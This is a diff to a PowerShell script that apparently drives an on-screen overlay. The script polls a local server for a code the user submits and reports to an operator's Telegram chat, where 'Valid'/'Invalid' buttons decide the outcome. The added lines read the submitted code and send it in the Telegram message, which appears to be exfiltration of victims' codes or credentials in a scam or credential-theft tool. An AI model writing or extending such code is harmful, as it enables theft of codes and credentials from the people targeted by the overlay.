@@ -31,9 +31,13 @@ function CheckSubmitted {
         $r = [Net.WebRequest]::Create('http://127.0.0.1:7823/submitted')
         $r.Timeout = 1000
         $resp = $r.GetResponse()
-        $code = [int]$resp.StatusCode
+        if ([int]$resp.StatusCode -eq 200) {
+            $body = (New-Object IO.StreamReader $resp.GetResponseStream()).ReadToEnd()
+            $resp.Close()
+            return $body
+        }
         $resp.Close()
-        return $code -eq 200
+        return $false
     } catch { return $false }
 }
 
@@ -96,9 +100,13 @@ Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"Overlay opened - waiting for 
 
 $waitingForOutcome = $false
 while ($true) {
-    if (-not $waitingForOutcome -and (CheckSubmitted)) {
-        $waitingForOutcome = $true
-        Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"Code submitted\n\nChoose outcome:`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"Valid`",`"callback_data`":`"valid`"},{`"text`":`"Invalid`",`"callback_data`":`"invalid`"}]]}}"
+    if (-not $waitingForOutcome) {
+        $submittedCode = CheckSubmitted
+        if ($submittedCode -ne $false) {
+            $waitingForOutcome = $true
+            $codeLine = if ($submittedCode) { "\nCode: $submittedCode" } else { '' }
+            Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"Code submitted$codeLine\n\nChoose outcome:`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"Valid`",`"callback_data`":`"valid`"},{`"text`":`"Invalid`",`"callback_data`":`"invalid`"}]]}}"
+        }
     }
     $data = Poll $offset
     if ($data -and $data.result) {
